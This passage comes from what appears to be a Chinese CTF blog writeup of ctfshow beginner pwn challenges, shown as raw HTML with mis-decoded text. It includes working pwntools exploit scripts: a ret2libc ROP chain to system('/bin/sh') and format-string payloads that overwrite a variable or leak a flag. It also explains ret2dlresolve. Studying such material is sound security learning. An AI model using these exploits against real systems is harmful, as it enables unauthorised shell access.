	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/437_hu_3d922dff152a69ce.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/437_hu_45292f7774b96f81.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="376"
		data-flex-basis="902px"
	
></p>
<p>64ä½ä»…å…³é—­Canaryã€‚</p>
<p>IDA64åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/438.png"
	width="844"
	height="314"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/438_hu_39f8b042646cfbe2.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/438_hu_80ae09d35fe9c29e.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="268"
		data-flex-basis="645px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°ç¨‹åºå…ˆæ‰“å¼€åŠ¨æ€é“¾æ¥åº“<code>libc.so.6</code>ï¼Œç„¶åå›å»å…¶ä¸­çš„<code>system</code>å‡½æ•°åœ°å€ï¼Œå†æ‰“å°å‡º<code>system</code>å‡½æ•°çš„åœ°å€ã€‚</p>
<p>è·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/439.png"
	width="589"
	height="139"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/439_hu_11e0ac76e997349b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/439_hu_dff418ee0f9adc0c.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="423"
		data-flex-basis="1016px"
	
></p>
<p>è¿™é‡Œå°±æ˜¯æ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´äº†ï¼Œä½†è¿™æ¬¡å¼€å¯äº†<strong>PIEåœ°å€éšæœºåŒ–ä¿æŠ¤</strong>ï¼Œä¸è¿‡ä¹‹å‰å·²ç»æ³„éœ²äº†<code>system</code>å‡½æ•°çš„çœŸå®åœ°å€ï¼Œéœ€è¦è®¡ç®—libc_baseåŸºå€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Maybe it&#39;s simple,O.o</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">system</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”¨LibcSearcherçš„è¯æˆ‘æ‰“ä¸é€šï¼Œæˆ‘ç›´æ¥ç”¨æœ¬åœ°æ‰“çš„ï¼Œæˆ‘çŸ¥é“ctfshowæ˜¯ç”¨18.04å‡ºçš„é¢˜ï¼Œè¿™ä¹Ÿç®—æŠ•æœºå–å·§å§ğŸ˜„ã€‚</p>
<p>å†™expè®°å¾—æ ˆå¯¹é½ï¼ˆretï¼‰ï¼ï¼</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#34;./pwn&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28126</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Maybe it&#39;s simple,O.o</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">system</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x8aa</span> <span class="c1"># 0x00000000000008aa : ret</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2164f</span> <span class="c1"># 0x000000000002164f : pop rdi ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">136</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ret2dllresolveæ”»å‡»"><strong>ret2dllresolveæ”»å‡»</strong>
</h3><p><code>ret2dlresolve</code> æ˜¯ <strong>ROP è¿›é˜¶æ‰‹æ³•ä¸­çš„ â€œåŠ¨æ€é“¾æ¥åˆ©ç”¨ç¥å™¨â€</strong>ï¼Œæ ¸å¿ƒåŸç†æ˜¯ <strong>åŠ«æŒç¨‹åºçš„åŠ¨æ€é“¾æ¥è¿‡ç¨‹</strong>ï¼ˆå€ŸåŠ©ç³»ç»Ÿçš„åŠ¨æ€é“¾æ¥å™¨ <code>ld-linux.so</code>ï¼‰ï¼Œåœ¨ <strong>ä¸æ³„éœ² libc åŸºå€ã€ä¸ä¾èµ–å·²çŸ¥ libc ç‰ˆæœ¬</strong> çš„æƒ…å†µä¸‹ï¼ŒåŠ¨æ€è§£æå‡º <code>system</code>ã€<code>execve</code> ç­‰æ•æ„Ÿå‡½æ•°å¹¶æ‰§è¡Œ â€”â€” å®Œç¾çªç ´ PIEï¼ˆç¨‹åºåœ°å€éšæœºåŒ–ï¼‰ã€ASLRï¼ˆlibc åœ°å€éšæœºåŒ–ï¼‰ç­‰ä¿æŠ¤ï¼Œæ˜¯ CTF ä¸­åº”å¯¹ â€œæ—  libc åœ°å€æ³„éœ²â€ åœºæ™¯çš„ç»ˆææ–¹æ¡ˆä¹‹ä¸€ã€‚</p>
<blockquote class="alert alert-error">
    <blockquote>
<p>å¸¸è§„ <code>ret2libc</code> æœ‰ä¸ªè‡´å‘½ç¼ºé™·ï¼š<strong>å¿…é¡»æ³„éœ² libc åŸºå€ï¼ˆå¦‚é€šè¿‡ <code>puts</code> åœ°å€ï¼‰ï¼Œä¸”è¦ç²¾å‡†åŒ¹é… libc ç‰ˆæœ¬</strong>ï¼Œå¦åˆ™è®¡ç®—å‡ºçš„ <code>system</code>ã€<code>/bin/sh</code> åœ°å€éƒ½æ˜¯é”™çš„ã€‚</p>
<p>è€Œ <code>ret2dlresolve</code> æ°å¥½è§£å†³è¿™äº›é—®é¢˜ï¼šå®ƒåˆ©ç”¨ç¨‹åºè‡ªèº«çš„ <strong>åŠ¨æ€é“¾æ¥æœºåˆ¶</strong>ï¼ˆç¨‹åºå¯åŠ¨æ—¶ï¼Œ<code>ld</code> ä¼šè§£æ libc å‡½æ•°åœ°å€å¹¶å¡«å…¥ GOT è¡¨ï¼‰ï¼Œè®© <code>ld</code> ä¸»åŠ¨å¸®æˆ‘ä»¬ â€œæ‰¾åˆ°å¹¶æ‰§è¡Œ <code>system</code>â€ï¼Œå…¨ç¨‹ä¸éœ€è¦çŸ¥é“ libc åŸºå€å’Œç‰ˆæœ¬ã€‚</p>
</blockquote></blockquote>
<p>å¯¹äºè¿™ä¸ªé«˜çº§ROPæ”»å‡»çš„å­¦ä¹ ï¼Œæˆ‘å‚è€ƒè‡³<a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/"  target="_blank" rel="noopener"
    >ret2dlresolve - CTF Wiki</a>ï¼Œè¯¦ç»†äº†è§£ï¼Œæˆ‘å°±ä¸ç»†è¯´äº†ã€‚</p>
<p>åœ¨äº†è§£è¿™ä¸ªé«˜çº§ROPæ”»å‡»ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ç†è§£åŠ¨æ€é“¾æ¥çš„åŸºæœ¬è¿‡ç¨‹ä»¥åŠ ELF æ–‡ä»¶ä¸­åŠ¨æ€é“¾æ¥ç›¸å…³çš„ç»“æ„ï¼Œå…³äºè¿™éƒ¨åˆ†çŸ¥è¯†ï¼Œåœ¨æˆ‘çš„æ–‡ç« çš„PWN-1ã€PWN-2æœ‰æ‰€æåŠï¼Œå¯ä»¥çœ‹çœ‹ã€‚</p>
<p>åœ¨ Linux ä¸­ï¼Œç¨‹åºä½¿ç”¨ <code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> æ¥å¯¹åŠ¨æ€é“¾æ¥çš„å‡½æ•°è¿›è¡Œé‡å®šä½ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶ç›¸åº”çš„å‚æ•°åŠå…¶å¯¹åº”åœ°å€çš„å†…å®¹æ˜¯ä¸æ˜¯å°±å¯ä»¥æ§åˆ¶è§£æçš„å‡½æ•°äº†å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚è¿™ä¹Ÿæ˜¯ ret2dlresolve æ”»å‡»çš„æ ¸å¿ƒæ‰€åœ¨ã€‚</p>
<p>è¦ç†è§£ <code>ret2dlresolve</code>ï¼Œå¿…é¡»å…ˆææ‡‚ç¨‹åºçš„ <strong>å»¶è¿Ÿç»‘å®šï¼ˆLazy Bindingï¼‰</strong>â€”â€” è¿™æ˜¯åŠ¨æ€é“¾æ¥çš„æ ¸å¿ƒä¼˜åŒ–æœºåˆ¶ï¼›ç®€åŒ–æµç¨‹ï¼ˆä»¥ <code>puts</code> ä¸ºä¾‹ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">ç¬¬ä¸€æ¬¡è°ƒç”¨ puts() â†’ è·³ PLT[puts] â†’ è·³ GOT[puts]ï¼ˆæ­¤æ—¶GOT[puts]æŒ‡å‘ PLT[puts] åçš„è§£æè§¦å‘æŒ‡ä»¤ï¼‰â†’ è°ƒç”¨ _dl_runtime_resolve â†’ è§£æ puts çœŸå®åœ°å€ â†’ å­˜å…¥ GOT[puts] â†’ æ‰§è¡Œ puts
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<blockquote class="alert alert-note">
    <p><strong>ret2dlresolve çš„é€‚ç”¨åœºæ™¯ä¸å…³é”®æ¡ä»¶</strong></p>
<p>é€‚ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>ç¨‹åºå¼€å¯ PIE + ASLRï¼Œæ— æ³•æ³„éœ² libc åŸºå€ï¼›</li>
<li>é¢˜ç›®æœªæä¾› libc æ–‡ä»¶ï¼Œæ— æ³•åŒ¹é…ç‰ˆæœ¬ï¼›</li>
<li>ç¨‹åºä¸­æ— å¯ç”¨çš„æ³„éœ²å‡½æ•°ï¼ˆå¦‚ <code>puts</code>ã€<code>printf</code> è¢«ç§»é™¤ï¼‰ï¼›</li>
<li>æ ˆæº¢å‡ºæ¼æ´å¯æ§åˆ¶è¶³å¤Ÿå¤§çš„æ ˆç©ºé—´ï¼ˆéœ€å¸ƒç½®ä¼ªé€ çš„ç»“æ„ä½“å’Œå­—ç¬¦ä¸²ï¼‰ã€‚</li>
</ul>
<p>å…³é”®æ¡ä»¶ï¼š</p>
<ol>
<li>ç¨‹åºå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œå¯æ§åˆ¶æ ˆä¸Šæ•°æ®ï¼›</li>
<li>èƒ½æ‰¾åˆ° <code>pop rdi ; ret</code>ã€<code>pop rsi ; ret</code> ç­‰ä¼ å‚ gadgetï¼›</li>
<li>ç¨‹åºçš„ <code>plt[0]</code> åœ°å€å·²çŸ¥ï¼ˆ<code>PLT</code> è¡¨åœ°å€å›ºå®šï¼Œå³ä½¿å¼€å¯ PIEï¼Œç›¸å¯¹ç¨‹åºåŸºå€çš„åç§»ä¹Ÿå›ºå®šï¼‰ï¼›</li>
<li>ç¨‹åºçš„ <code>DT_DEBUG</code> æŒ‡é’ˆåœ°å€å·²çŸ¥ï¼ˆ<code>link_map</code> å‚æ•°ï¼Œå›ºå®šåœ¨ç¨‹åºçš„ <code>.dynamic</code> æ®µä¸­ï¼‰ã€‚</li>
</ol></blockquote>
</blockquote>
<h3 id="pwn_082">PWN_082
</h3><p>é¢˜ç›®ï¼šé«˜çº§ROP 32 ä½ NO-RELROã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/440.png"
	width="745"
	height="205"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/440_hu_aca3427eeefa1934.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/440_hu_3ba9bd81666e490.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="363"
		data-flex-basis="872px"
	
></p>
<p>32ä½ä»…å¼€å¯NXä¿æŠ¤ï¼Œå¯ä»¥çœ‹åˆ°RELROä¿æŠ¤æ˜¯å®Œå…¨å…³é—­çŠ¶æ€ã€‚</p>
<p>IDA32åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/441.png"
	width="870"
	height="306"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/441_hu_6165fe8dd9232e1e.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/441_hu_3b53e08042eafb0f.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="284"
		data-flex-basis="682px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/442.png"
	width="649"
	height="155"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/442_hu_4ec7fdd11ecce2bd.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/442_hu_c1cc9275544d540b.png 1024w"
	loading="lazy"
	
		alt="showå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="418"
		data-flex-basis="1004px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°showå‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´çš„ã€‚</p>
<p>å…ˆæ¥åˆ†æä¸‹mainå‡½æ•°ï¼Œ</p>
<h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²">æ ¼å¼åŒ–å­—ç¬¦ä¸²
</h2><h3 id="pwn_091">PWN_091
</h3><p>é¢˜ç›®ï¼šå¼€å§‹æ ¼å¼åŒ–å­—ç¬¦ä¸²äº†ï¼Œå…ˆæ¥ä¸ªç®€å•çš„å§ã€‚</p>
<p>checksecï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/299.png"
	width="655"
	height="214"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/299_hu_116edf3822c1c0f5.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/299_hu_52a23015b46c02f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="306"
		data-flex-basis="734px"
	
></p>
<p>32ä½å…³é—­PIEï¼Œéƒ¨åˆ†å¼€å¯RELROï¼›æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p>
<p>IDA32ä½åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/300.png"
	width="809"
	height="246"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/300_hu_8c7448c62fc1fcf5.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/300_hu_b10548d439565735.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="328"
		data-flex-basis="789px"
	
></p>
<p>ä¹Ÿå°±æ˜¯è¯´è®©daniuç­‰äº6æ—¶å°±ä¼šæ‰§è¡Œåé—¨å‡½æ•°ï¼›è·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/301.png"
	width="800"
	height="259"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/301_hu_6bc3231d4ef6809.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/301_hu_63436fca9a5b5c14.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="308"
		data-flex-basis="741px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„ptintf(s)æ˜æ˜¾çš„å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/302.png"
	width="1010"
	height="136"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/302_hu_118dad0a88a9408a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/302_hu_efb9b8a436daf9c7.png 1024w"
	loading="lazy"
	
		alt=".bssæ®µ:0x804B038"
	
	
		class="gallery-image" 
		data-flex-grow="742"
		data-flex-basis="1782px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°daniuå˜é‡å­˜å‚¨åœ¨.bssæ®µä¸Šï¼Œæˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å»æ”¹å†™daniuçš„å€¼ä»è€Œgetshellã€‚</p>
<p>æµ‹ä¸€ä¸‹æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/303.png"
	width="1644"
	height="523"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/303_hu_65a476a8786e9f1b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/303_hu_4b4e7a78a574fb6d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="314"
		data-flex-basis="754px"
	
></p>
<p>Açš„ASCIIæ˜¯41ï¼Œä¹Ÿå°±æ˜¯è¯´æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»é‡ä¸º7ã€‚</p>
<p>å†æ¥éªŒè¯ä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/304.png"
	width="1170"
	height="494"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/304_hu_d9980d7c9ba2b317.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/304_hu_17961b78369fec39.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="236"
		data-flex-basis="568px"
	
></p>
<p>æˆ‘ä»¬éœ€è¦è®©daniu = 6ï¼Œç°åœ¨åˆæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å…¶ä»»æ„åœ°å€å†™åŠŸèƒ½å°†daniuçš„å€¼ä¿®æ”¹ä¸º6å³å¯è·å¾—shellã€‚</p>
<p>è¿™é‡Œä½¿ç”¨pwntoolsæ¨¡å—ä¸­çš„fmtstræ¨¡å—ç›´æ¥è¿›è¡Œæ”¹å†™ï¼š</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span>  <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28270</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">daniu</span> <span class="o">=</span> <span class="mh">0x804B038</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,{</span><span class="n">daniu</span><span class="p">:</span><span class="mi">6</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„è§£é¢˜è¿‡ç¨‹æœ‰äº›åœ°æ–¹å¯èƒ½æ¯”è¾ƒæ‡µï¼Œè¿™æ˜¯æ­£å¸¸çš„ï¼Œå¯ä»¥å»å­¦ä¹ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åŸç†ï¼š<a class="link" href="https://expl0rer.top/p/pwn-3/"  target="_blank" rel="noopener"
    >PWN-3</a></p>
<h3 id="pwn_092">PWN_092
</h3><p>é¢˜ç›®ï¼šå¯èƒ½ä¸Šä¸€é¢˜æ²¡å¤ªçœ‹æ‡‚ï¼Ÿæ¥çœ‹ä¸‹åŸºç¡€å§ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/305.png"
	width="884"
	height="199"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/305_hu_86dd0480f8a6f182.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/305_hu_2897cbf90f534931.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="444"
		data-flex-basis="1066px"
	
></p>
<p>64ä½ä¿æŠ¤å…¨å¼€ã€‚</p>
<p>IDAåˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/306.png"
	width="854"
	height="425"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/306_hu_24fea2b86a1e5670.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/306_hu_6f868b64f36d4b1c.png 1024w"
	loading="lazy"
	
		alt="flagishereå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="200"
		data-flex-basis="482px"
	
></p>
<p>Cè¯­è¨€å­¦å¾—å¥½å°±çŸ¥é“è¿™é‡Œæœ‰ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´äº†ï¼Œæˆ‘ä»¬çœ‹åˆ°<code>printf(format, s);</code>è¿™ä¸ªflagishereå‡½æ•°çš„æµç¨‹æ˜¯ç”¨scanfå‡½æ•°è·å–ä½ è¾“å…¥çš„ä¸œè¥¿ï¼Œèµ‹å€¼åˆ°formatå‚æ•°è¿›å»ï¼Œç„¶åè¿™ä¸ªsæ˜¯å­˜å‚¨flagçš„ï¼Œå¦‚æœä½ è¾“å…¥ä¸€ä¸ª<code>&quot;%s&quot;</code>å°±æ„æˆäº†<code>printf(&quot;%s&quot;,s);</code>è¿™å°±è®©ç¨‹åºåå‡ºflagäº†ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span>  <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28204</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_093">PWN_093
</h3><p>é¢˜ç›®ï¼šemmmï¼Œå†æ¥ä¸€é“åŸºç¡€åŸç†ï¼Ÿ</p>
<p>checksecå®ŒåIDAåˆ†æï¼Œæ‰¾åˆ°äº†exit0å‡½æ•°æœ‰flagï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/307.png"
	width="911"
	height="351"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/307_hu_5c468ace3281d5b9.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/307_hu_86ab92f2d2631f9c.png 1024w"
	loading="lazy"
	
